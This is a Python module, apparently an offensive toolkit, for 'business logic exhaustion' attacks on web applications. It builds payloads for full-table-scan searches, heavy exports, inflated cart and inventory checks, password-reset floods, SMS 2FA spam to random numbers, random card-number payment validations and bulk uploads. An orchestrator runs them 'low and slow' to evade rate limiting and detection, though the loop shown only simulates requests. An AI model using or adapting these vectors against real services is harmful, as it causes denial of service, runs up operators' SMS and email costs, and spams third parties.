"""
Business Logic Exhaustion - 2026
Target expensive business operations that appear legitimate but exhaust resources.
Low-volume, high-impact attacks that bypass rate limiting.
"""
import asyncio
import random
import string
from typing import Dict, List, Optional
from dataclasses import dataclass
import json


@dataclass
class BusinessLogicVector:
    """Business logic attack vector definition."""
    name: str
    endpoint: str
    method: str
    payload: Dict
    cost_multiplier: float
    detection_difficulty: float


class DatabaseExhaustion:
    """Attack vectors that cause expensive database operations."""
    
    @staticmethod
    def generate_complex_search_queries(keywords: List[str]) -> List[Dict]:
        """Generate search queries that cause full table scans."""
        queries = []
        
        # Wildcard searches (force full scan)
        for keyword in keywords:
            queries.append({
                'q': f"%{keyword}%",
                'type': 'wildcard_both_sides',
                'cost': 'high'
            })
            
            # Multiple OR conditions
            queries.append({
                'q': ' OR '.join([f"{keyword}{i}" for i in range(20)]),
                'type': 'multiple_or',
                'cost': 'very_high'
            })
            
            # Complex LIKE patterns
            queries.append({
                'q': f"%{keyword[0]}%{keyword[1]}%{keyword[2]}%",
                'type': 'multiple_wildcards',
                'cost': 'extreme'
            })
        
        # Range queries without indexes
        queries.append({
            'price_min': 0.01,
            'price_max': 999999.99,
            'date_from': '2000-01-01',
            'date_to': '2030-12-31',
            'type': 'wide_range',
            'cost': 'high'
        })
        
        # Sorting by unindexed columns
        queries.append({
            'sort_by': 'random_column',
            'order': 'desc',
            'limit': 10000,
            'type': 'expensive_sort',
            'cost': 'very_high'
        })
        
        return queries
    
    @staticmethod
    def generate_join_heavy_queries() -> List[Dict]:
        """Generate queries that cause expensive JOINs."""
        return [
            {
                'include': ['users', 'orders', 'products', 'reviews', 'categories', 'tags'],
                'type': 'multiple_joins',
                'cost': 'extreme'
            },
            {
                'nested': True,
                'depth': 5,
                'type': 'nested_relations',
                'cost': 'extreme'
            }
        ]
    
    @staticmethod
    def generate_aggregation_queries() -> List[Dict]:
        """Generate expensive aggregation queries."""
        return [
            {
                'group_by': ['field1', 'field2', 'field3', 'field4'],
                'aggregate': ['sum', 'avg', 'count', 'min', 'max'],
                'type': 'complex_aggregation',
                'cost': 'very_high'
            },
            {
                'distinct': True,
                'count': True,
                'fields': ['*'],
                'type': 'distinct_count_all',
                'cost': 'extreme'
            }
        ]


class APIExhaustion:
    """Attack vectors targeting expensive API operations."""
    
    @staticmethod
    def generate_export_requests(format: str = 'pdf') -> List[Dict]:
        """Generate expensive export/report generation requests."""
        return [
            {
                'endpoint': '/api/export',
                'format': format,
                'date_range': 'all_time',
                'include_images': True,
                'include_attachments': True,
                'page_size': 'A4',
                'quality': 'high',
                'cost': 'extreme'
            },
            {
                'endpoint': '/api/report/generate',
                'type': 'comprehensive',
                'charts': True,
                'graphs': True,
                'data_points': 100000,
                'cost': 'very_high'
            }
        ]
    
    @staticmethod
    def generate_image_processing_requests() -> List[Dict]:
        """Generate expensive image processing requests."""
        return [
            {
                'endpoint': '/api/image/process',
                'operations': ['resize', 'crop', 'rotate', 'filter', 'compress'],
                'size': 'original',
                'quality': 100,
                'format': 'png',
                'cost': 'high'
            },
            {
                'endpoint': '/api/image/thumbnail',
                'sizes': [100, 200, 400, 800, 1600, 3200],
                'format': 'png',
                'quality': 100,
                'cost': 'very_high'
            }
        ]
    
    @staticmethod
    def generate_email_operations() -> List[Dict]:
        """Generate expensive email operations."""
        return [
            {
                'endpoint': '/api/email/send',
                'recipients': ['user@example.com'] * 100,
                'attachments': [{'size': 10485760}] * 5,  # 5x 10MB
                'template': 'complex_html',
                'cost': 'extreme'
            },
            {
                'endpoint': '/api/newsletter/send',
                'list': 'all_users',
                'personalized': True,
                'track_opens': True,
                'track_clicks': True,
                'cost': 'very_high'
            }
        ]


class CheckoutExhaustion:
    """Attack vectors targeting checkout and payment flows."""
    
    @staticmethod
    def generate_cart_operations() -> List[Dict]:
        """Generate expensive cart operations."""
        return [
            {
                'endpoint': '/api/cart/calculate',
                'items': [{'id': i, 'quantity': 999} for i in range(100)],
                'coupons': ['CODE' + str(i) for i in range(50)],
                'shipping_methods': ['standard', 'express', 'overnight'],
                'cost': 'extreme'
            },
            {
                'endpoint': '/api/cart/validate',
                'check_inventory': True,
                'check_pricing': True,
                'check_coupons': True,
                'check_shipping': True,
                'cost': 'very_high'
            }
        ]
    
    @staticmethod
    def generate_payment_validations() -> List[Dict]:
        """Generate expensive payment validation requests."""
        return [
            {
                'endpoint': '/api/payment/validate',
                'card_number': '4' + ''.join(random.choices(string.digits, k=15)),
                'cvv': ''.join(random.choices(string.digits, k=3)),
                'validate_3ds': True,
                'check_fraud': True,
                'cost': 'high'
            },
            {
                'endpoint': '/api/payment/methods',
                'country': 'US',
                'currency': 'USD',
                'amount': 999999.99,
                'cost': 'medium'
            }
        ]
    
    @staticmethod
    def generate_inventory_checks() -> List[Dict]:
        """Generate expensive inventory check requests."""
        return [
            {
                'endpoint': '/api/inventory/check',
                'products': [{'id': i} for i in range(1000)],
                'locations': ['warehouse1', 'warehouse2', 'warehouse3', 'store1', 'store2'],
                'real_time': True,
                'cost': 'extreme'
            }
        ]


class AuthenticationExhaustion:
    """Attack vectors targeting authentication systems."""
    
    @staticmethod
    def generate_password_reset_requests(email: str) -> List[Dict]:
        """Generate password reset requests (expensive email operations)."""
        return [
            {
                'endpoint': '/api/auth/password-reset',
                'email': email,
                'send_email': True,
                'cost': 'medium'
            }
        ] * 100  # Trigger rate limiting and email costs
    
    @staticmethod
    def generate_2fa_requests() -> List[Dict]:
        """Generate 2FA requests (expensive SMS/email operations)."""
        return [
            {
                'endpoint': '/api/auth/2fa/send',
                'method': 'sms',
                'phone': '+1' + ''.join(random.choices(string.digits, k=10)),
                'cost': 'high'  # SMS costs money
            },
            {
                'endpoint': '/api/auth/2fa/verify',
                'code': ''.join(random.choices(string.digits, k=6)),
                'attempts': 10,
                'cost': 'medium'
            }
        ]
    
    @staticmethod
    def generate_session_operations() -> List[Dict]:
        """Generate expensive session operations."""
        return [
            {
                'endpoint': '/api/auth/session/refresh',
                'token': ''.join(random.choices(string.ascii_letters + string.digits, k=64)),
                'validate_all_claims': True,
                'cost': 'medium'
            }
        ]


class FileOperationExhaustion:
    """Attack vectors targeting file operations."""
    
    @staticmethod
    def generate_upload_requests() -> List[Dict]:
        """Generate expensive file upload requests."""
        return [
            {
                'endpoint': '/api/upload',
                'file_size': 104857600,  # 100MB
                'scan_virus': True,
                'generate_thumbnails': True,
                'extract_metadata': True,
                'cost': 'extreme'
            },
            {
                'endpoint': '/api/upload/batch',
                'files': [{'size': 10485760} for _ in range(50)],  # 50x 10MB
                'cost': 'extreme'
            }
        ]
    
    @staticmethod
    def generate_download_requests() -> List[Dict]:
        """Generate expensive download requests."""
        return [
            {
                'endpoint': '/api/download/archive',
                'format': 'zip',
                'files': [f'file{i}.dat' for i in range(1000)],
                'compression': 'maximum',
                'cost': 'extreme'
            }
        ]


class BusinessLogicAttackEngine:
    """Orchestrate business logic exhaustion attacks."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vectors: List[BusinessLogicVector] = []
        self._initialize_vectors()
    
    def _initialize_vectors(self):
        """Initialize all attack vectors."""
        # Database exhaustion vectors
        for query in DatabaseExhaustion.generate_complex_search_queries(['product', 'user']):
            self.vectors.append(BusinessLogicVector(
                name='complex_search',
                endpoint='/api/search',
                method='GET',
                payload=query,
                cost_multiplier=5.0,
                detection_difficulty=0.8
            ))
        
        # API exhaustion vectors
        for req in APIExhaustion.generate_export_requests('pdf'):
            self.vectors.append(BusinessLogicVector(
                name='export_generation',
                endpoint=req['endpoint'],
                method='POST',
                payload=req,
                cost_multiplier=10.0,
                detection_difficulty=0.9
            ))
        
        # Checkout exhaustion vectors
        for op in CheckoutExhaustion.generate_cart_operations():
            self.vectors.append(BusinessLogicVector(
                name='cart_calculation',
                endpoint=op['endpoint'],
                method='POST',
                payload=op,
                cost_multiplier=8.0,
                detection_difficulty=0.85
            ))
        
        # Authentication exhaustion vectors
        for req in AuthenticationExhaustion.generate_2fa_requests():
            self.vectors.append(BusinessLogicVector(
                name='2fa_sms',
                endpoint=req['endpoint'],
                method='POST',
                payload=req,
                cost_multiplier=15.0,  # SMS costs real money
                detection_difficulty=0.7
            ))
    
    async def execute_low_slow_attack(self, duration: int, rps: float = 0.5) -> Dict:
        """Execute low-and-slow business logic attack."""
        results = {
            'duration': duration,
            'target_rps': rps,
            'vectors_used': len(self.vectors),
            'estimated_cost_impact': 0.0,
            'requests_sent': 0,
            'successful': 0
        }
        
        start_time = asyncio.get_event_loop().time()
        request_interval = 1.0 / rps
        
        while asyncio.get_event_loop().time() - start_time < duration:
            # Select random high-cost vector
            vector = random.choice(self.vectors)
            
            # Simulate request
            await asyncio.sleep(request_interval)
            
            results['requests_sent'] += 1
            results['estimated_cost_impact'] += vector.cost_multiplier
            
            # Simulate success rate based on detection difficulty
            if random.random() < vector.detection_difficulty:
                results['successful'] += 1
        
        results['success_rate'] = results['successful'] / results['requests_sent'] if results['requests_sent'] > 0 else 0
        results['avg_cost_per_request'] = results['estimated_cost_impact'] / results['requests_sent'] if results['requests_sent'] > 0 else 0
        
        return results
    
    def get_high_impact_vectors(self, top_n: int = 10) -> List[BusinessLogicVector]:
        """Get highest impact vectors."""
        sorted_vectors = sorted(
            self.vectors,
            key=lambda v: v.cost_multiplier * v.detection_difficulty,
            reverse=True
        )
        return sorted_vectors[:top_n]


async def execute_business_logic_attack(target_url: str, duration: int = 300, 
                                       rps: float = 0.5) -> Dict:
    """Main entry point for business logic attack."""
    engine = BusinessLogicAttackEngine(target_url)
    results = await engine.execute_low_slow_attack(duration, rps)
    
    # Add vector analysis
    results['high_impact_vectors'] = [
        {
            'name': v.name,
            'endpoint': v.endpoint,
            'cost_multiplier': v.cost_multiplier,
            'detection_difficulty': v.detection_difficulty
        }
        for v in engine.get_high_impact_vectors(5)
    ]
    
    return results
